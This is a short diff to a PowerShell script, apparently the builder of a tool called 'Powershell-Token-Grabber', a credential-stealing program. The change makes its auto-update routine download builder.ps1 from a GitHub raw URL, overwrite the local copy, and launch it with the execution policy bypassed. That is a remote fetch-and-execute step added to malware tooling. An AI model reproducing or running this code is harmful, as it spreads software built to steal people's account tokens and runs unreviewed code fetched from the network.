@@ -183,9 +183,10 @@ function Invoke-EXE {
 function Invoke-AutoUpdate {
     $update_url = "https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/builder.ps1"
     $update = (New-Object System.Net.WebClient).DownloadString($update_url)
-    $current_code = Get-Content -Path "$PSScriptRoot\t.ps1" -Raw
+    $current_code = Get-Content -Path "$PSScriptRoot\builder.ps1" -Raw
     if ($update -ne $current_code) {
-        $update | Out-File -FilePath "$PSScriptRoot\t.ps1" -Force -Encoding ascii
+        $update | Out-File -FilePath "$PSScriptRoot\builder.ps1" -Force -Encoding ascii
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $PSScriptRoot\builder.ps1" -Wait -NoNewWindow
     }
 }
 
